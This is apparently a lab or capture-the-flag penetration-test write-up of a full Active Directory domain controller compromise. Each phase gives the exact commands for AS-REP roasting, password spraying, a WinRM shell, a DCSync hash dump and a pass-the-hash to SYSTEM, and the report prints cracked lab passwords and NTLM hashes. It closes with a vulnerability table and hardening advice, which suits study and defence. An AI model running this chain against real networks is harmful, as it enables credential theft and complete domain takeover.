# Red Team Report -- Professional Portfolio

## Domain Controller Compromise -- NTDS.DIT + root.txt

**Author:** Red Team Operator  
**Date:** 15 March 2026  
**Target:** controller.control.nyx -- 192.168.0.40  
**Engagement Type:** Active Directory Pentesting (grey box, lab environment)

---

## Phase 0 -- Host Discovery

<img width="946" height="480" alt="image" src="https://github.com/user-attachments/assets/262499b4-f28f-4968-8199-6d6cf50db08a" />

**Executed command**

```bash
ping 192.168.0.40
```

**Relevant result**

- 5/5 packets received.
- 0% packet loss.
- Average RTT ≈ 1.54 ms.

**Personal comment**  
I first verified that the target responded correctly at network level; the low latency confirmed that I could continue with enumeration without connectivity issues.

---

## Phase 1 -- Service Enumeration (Nmap)

**Image -- Full Nmap scan**

<img width="1025" height="479" alt="image" src="https://github.com/user-attachments/assets/db30af9e-e928-4413-b84f-37412d1f7d75" />

**Executed commands**

```bash
nmap -sS --open -sC -sV -n -Pn 192.168.0.40
nmap -sS --reason 192.168.0.40
```

**Detected services (open TCP ports)**

- 53/tcp -- DNS (Simple DNS Plus)
- 88/tcp -- Kerberos-sec (Microsoft Windows Kerberos)
- 135/tcp -- MSRPC
- 139/tcp -- NetBIOS-SSN
- 389/tcp -- LDAP (Active Directory)
- 445/tcp -- SMB (microsoft-ds)
- 464/tcp -- kpasswd5
- 593/tcp -- RPC over HTTP
- 636/tcp -- LDAPS
- 3268/tcp -- Global Catalog LDAP
- 3269/tcp -- Global Catalog LDAPS
- 5985/tcp -- WinRM (HTTP)

**Host identification**

- Name: CONTROLER
- Domain: control.nyx / control.nyx0
- System: Windows 10 / Server 2019 Build 17763 x64
- SMB signing: required
- Clock skew: 8h

**Personal comment**  
As soon as I saw Kerberos (88), LDAP (389), Global Catalog (3268), and SMB (445) on the same host, it was clear that I was dealing with a Domain Controller. From that point on, the entire strategy focused on Active Directory.

---

## Phase 2 -- SMB Enumeration (Without Credentials)

**Image 1 -- NetExec null session**

<img width="1178" height="431" alt="image" src="https://github.com/user-attachments/assets/be6490fe-5116-4721-9261-906067147d4c" />

**Main command**

```bash
netexec smb 192.168.0.40 -u '' -p ''
```

**Result**

- Anonymous SMB connection succeeded (null session) against 445/tcp.

**Image 2 -- smbclient IPC$**

<img width="1182" height="403" alt="image" src="https://github.com/user-attachments/assets/d5bceeca-605f-421c-b00d-1aef87e65a5a" />

**Complementary command**

```bash
smbclient //192.168.0.40/IPC$ -N
```

**Observations**

- Anonymous login was accepted on IPC$.
- `ls` attempts returned `ACCESS_DENIED`, but directory names were listed, which confirmed the presence of pentesting tools in the environment.

**Personal comment**  
I confirmed that a null session was active, something that should not happen on a Domain Controller. Even though permissions were limited, this first weakness showed that SMB hardening was insufficient.

---

## Phase 3 -- DNS and LDAP Enumeration

**Image -- dig / LDAP rootDSE queries**

<img width="770" height="562" alt="image" src="https://github.com/user-attachments/assets/c5d519d4-b3de-4bc4-86d3-3c74755adf7e" />

**DNS -- Key commands**

<img width="1183" height="578" alt="image" src="https://github.com/user-attachments/assets/8aea8e1f-5ded-4d2a-8368-a91592adbebf" />

```bash
dig @192.168.0.40 controler.control.nyx A
dig @192.168.0.40 _kerberos._tcp.dc._msdcs.control.nyx SRV
dig @192.168.0.40 control.nyx0 A
```

**Result**

- `controler.control.nyx` → `192.168.0.40`
- `_kerberos._tcp.dc._msdcs.control.nyx` → SRV record pointing to `win-ula25fos4k9.control.nyx:88` (another DC)

**LDAP -- rootDSE command**

```bash
ldapsearch -x -H ldap://192.168.0.40 -s base namingcontexts
```

<img width="1176" height="469" alt="image" src="https://github.com/user-attachments/assets/9f873ef1-4f4f-4f04-b201-6c1b011c4b5b" />

**Naming contexts obtained**

- `DC=control,DC=nyx`
- `CN=Configuration,DC=control,DC=nyx`
- `CN=Schema,CN=Configuration,DC=control,DC=nyx`
- `DC=DomainDnsZones,DC=control,DC=nyx`
- `DC=ForestDnsZones,DC=control,DC=nyx`

**Personal comment**  
At this point I had mapped the domain and the full LDAP tree without credentials. This allowed me to plan user enumeration and Kerberos attacks in a very targeted way.

---

## Phase 4 -- User Enumeration (Kerbrute)

**Image -- Kerbrute userenum**

<img width="930" height="589" alt="image" src="https://github.com/user-attachments/assets/c642efd3-2a4c-475a-9570-f2767d4ad2f3" />

**Image -- Kerbrute userenum**

<img width="824" height="490" alt="image" src="https://github.com/user-attachments/assets/a3d977b2-72fe-48bd-9e81-c3dd5c4c61d2" />

**Executed commands**

```bash
./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.40 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.40 /home/kali/Downloads/windows/kerberos_enum_userlists/A-Z.Surnames.txt
```

**Valid users detected**

- `administrator@control.nyx` / `Administrator@control.nyx`
- `B.LEWIS@control.nyx`
- `b.lewis@control.nyx` (UPN)

**Personal comment**  
After several wordlists and seeing the KDC start to saturate, I focused on the users already confirmed as valid, especially `b.lewis`, which I later used as the pivot for AS-REP Roasting.

---

## Phase 5 -- AS-REP Roasting (b.lewis)

**Image -- GetNPUsers + AS-REP hash**

<img width="1161" height="550" alt="image" src="https://github.com/user-attachments/assets/896573f1-989e-42b1-a67e-1eac35633180" />

**Command**

```bash
impacket-GetNPUsers control.nyx/b.lewis -no-pass -dc-ip 192.168.0.40
```

**Result**

- AS-REP response returned without pre-authentication.
- Kerberos AS-REP hash obtained for `b.lewis@CONTROL.NYX`.

**Image -- John cracking**

<img width="1159" height="449" alt="image" src="https://github.com/user-attachments/assets/20514959-f508-4dc1-86db-22b3252ac8fe" />

**Offline cracking**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt has.txt
```

**Recovered password**

- `b.lewis : 101Music`

**Personal comment**  
Here I confirmed a weak Kerberos configuration (no pre-authentication) combined with a password present in `rockyou.txt`. This was the first strong domain credential I obtained.

---

## Phase 6 -- Credentialed Access (b.lewis)

**NetExec SMB with credentials**

<img width="1159" height="471" alt="image" src="https://github.com/user-attachments/assets/d8560317-9395-49a8-8053-a01826872870" />

**NetExec SMB with credentials**

<img width="1170" height="482" alt="image" src="https://github.com/user-attachments/assets/3d871f3b-17a9-4cb4-964c-b10723a80f1a" />

**Key commands**

```bash
netexec smb 192.168.0.40 -u b.lewis -p 101Music --shares
netexec smb 192.168.0.40 -u b.lewis -p 101Music --users
netexec ldap 192.168.0.40 -u b.lewis -p 101Music --groups
netexec ldap 192.168.0.40 -u b.lewis -p 101Music --computers
```

**Result**

- Accessible shares: `ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`.
- Enumerated local/domain users (Administrator, krbtgt, j.levy, etc.).
- Enumerated domain groups, with `b.lewis` in privileged groups.

**Personal comment**  
With `b.lewis` I confirmed read access to `SYSVOL` and could enumerate the full user and group structure. This validated that I had a high-value position inside the domain.

---

## Phase 7 -- Second Account: Password Spray (j.levy)

**NetExec password spray**

<img width="1176" height="545" alt="image" src="https://github.com/user-attachments/assets/c40bc896-2735-4efd-8caf-84f78033ea38" />

**Command**

```bash
nxc smb 192.168.0.40 -u j.levy -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

**Recovered credential**

- `j.levy : Password1`

**Image -- Validation and shares**

<img width="1186" height="523" alt="image" src="https://github.com/user-attachments/assets/e103fe3d-2ac6-4792-a009-9dc85bc94038" />

```bash
nxc smb 192.168.0.40 -u j.levy -p Password1
nxc smb 192.168.0.40 -u j.levy -p Password1 --users
nxc smb 192.168.0.40 -u j.levy -p Password1 --shares
```

**Personal comment**  
When I saw `Password1`, I confirmed that the password policy was extremely weak. This account also opened the door to WinRM, which made post-exploitation much more comfortable.

---

## Phase 8 -- Remote Access (WinRM) and user.txt

**Image -- Evil-WinRM shell**

<img width="1164" height="588" alt="image" src="https://github.com/user-attachments/assets/9447c44e-24a0-4e97-924e-dc26753bfa7c" />

**Commands**

```bash
nxc winrm 192.168.0.40 -u j.levy -p Password1
evil-winrm -i 192.168.0.40 -u j.levy -p 'Password1'
whoami /all
```

**Main results**

- Identity: `control\j.levy`
- Member of `Remote Management Users`
- Interactive PowerShell shell on the DC

**Image -- user.txt**

<img width="1174" height="578" alt="image" src="https://github.com/user-attachments/assets/3be8f8c9-c88e-4967-9343-6964d56a4164" />

```powershell
cd C:\Users\j.levy\Desktop
ls *# user.txt*
```

**Personal comment**  
With WinRM I obtained the first flag (`user.txt`) and confirmed that I could execute tools and move around the system comfortably with the compromised domain account.

---

## Phase 9 -- Local Enumeration (winPEAS + SharpHound)

**Upload winPEAS and SharpHound**

<img width="842" height="571" alt="image" src="https://github.com/user-attachments/assets/e2f21cb6-172a-4a0a-aaac-76699c4cb78c" />

**Upload winPEAS and SharpHound**

<img width="980" height="650" alt="image" src="https://github.com/user-attachments/assets/31cfcc93-6d3b-4373-87c4-0bb2de1786a0" />

**Commands**

```powershell
upload winPEASx64.exe
upload SharpHound.exe
.\winPEASx64.exe
.\SharpHound.exe -c all
```

**winPEAS findings (summary)**

- Typical user and system environment variables (`USERDNSDOMAIN=control.nyx`, `COMPUTERNAME=CONTROLER`).
- No credentials were found in environment variables.

**SharpHound**

- Enumerated groups, ACLs, sessions, GPOs, and more for offline analysis in BloodHound.

**Personal comment**  
I used winPEAS to look for additional weak configurations and SharpHound to consolidate the domain view in BloodHound, although by that point the compromise level was already very high.

---

## Phase 10 -- Domain Dump (secretsdump / DCSync)

**secretsdump output**

<img width="1182" height="495" alt="image" src="https://github.com/user-attachments/assets/599be5fd-4eb9-47fb-9af1-dc38270b05d1" />

**Command**

```bash
impacket-secretsdump "control.nyx/j.levy:Password1@controller.control.nyx"
```

**Key results (NTDS.DIT / hashes)**

- `Administrator:500:...:48b20d4f3ea31b7234c92b71c90fbff7`
- `Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0`
- `krbtgt:502:...:b70cca1e5225303104dea9942d31f3a7`
- `control.nyx\j.levy:1103:...:64f12cddaa88057e06a81b54e73b949b`
- `control.nyx\b.lewis:1104:...:08f37c649690b7df615961f71831ef4a`
- AES256/AES128/RC4 keys for all accounts, including `krbtgt` and the DC (`CONTROLER$`).

**Personal comment**  
At this point I had the full domain credential database. That means total control and the possibility of attacks such as Golden Ticket, massive Pass-the-Hash, or advanced persistence deployment.

---

## Phase 11 -- Pass-the-Hash and root.txt (Administrator)

**Image -- PsExec SYSTEM shell**

<img width="1165" height="494" alt="image" src="https://github.com/user-attachments/assets/8d881955-d715-435c-8294-1f0f21e915fe" />

**Command**

```bash
impacket-psexec -hashes :48b20d4f3ea31b7234c92b71c90fbff7 -no-pass \
-dc-ip 192.168.0.40 -target-ip 192.168.0.40 \
control.nyx/Administrator@controller.control.nyx
```

**Results**

- Remote service creation and shell with SYSTEM privileges.

**Image -- root.txt**

<img width="1136" height="517" alt="image" src="https://github.com/user-attachments/assets/06cc3d33-31f0-4de4-8738-2e97ff7dd4f2" />

```text
cd C:\Users\Administrator\Desktop
dir # root.txt (70 bytes)
```

**Personal comment**  
With the Administrator hash and Pass-the-Hash I obtained a SYSTEM shell and the `root.txt` flag, closing the full compromise of the Domain Controller.

---

## Compromise Chain Summary

1. Ping and Nmap → Identification of the DC and services.
2. SMB Null Session → confirmation of exposure and context.
3. Anonymous DNS + LDAP → domain mapping and naming contexts.
4. Kerbrute → valid user enumeration (`administrator`, `b.lewis`, `j.levy`).
5. AS-REP Roasting → `b.lewis : 101Music`.
6. NetExec + Password Spray → `j.levy : Password1`.
7. WinRM (Evil-WinRM) → remote shell + `user.txt`.
8. winPEAS + SharpHound → local and domain enumeration.
9. secretsdump / DCSync → NTDS.DIT and all domain hashes.
10. Pass-the-Hash (PsExec) → SYSTEM shell with Administrator + `root.txt`.

---

## Identified Vulnerabilities

| Vector | Impact | Brief description |
|---|---:|---|
| SMB Null Sessions | Medium | Allows initial enumeration without credentials. |
| Kerberos Enum | High | Enables mass enumeration of valid users. |
| AS-REP Roasting | High | Allows recovery of domain credentials. |
| Password Spray | High | Weak passwords such as `Password1`. |
| DCSync / NTDS.DIT | Critical | Full extraction of domain hashes. |
| Pass-the-Hash | Critical | Remote execution as Administrator/SYSTEM. |
| Exposed WinRM | High | Direct remote shell on the DC. |
| Accessible SYSVOL/GPO | Medium | Policy read access and future abuse potential. |

---

## High-Level Recommendations

- Disable SMB null sessions and harden IPC$ configuration.
- Enable Kerberos pre-authentication on all user accounts.
- Enforce strong password policies and account lockout protections against password spraying.
- Restrict and audit DCSync permissions to strictly necessary accounts.
- Limit or disable WinRM access from non-administrative networks.
- Review SYSVOL and GPO permissions to avoid leakage and abuse.
- Monitor Kerberos, WinRM, DCSync, and remote service creation events.
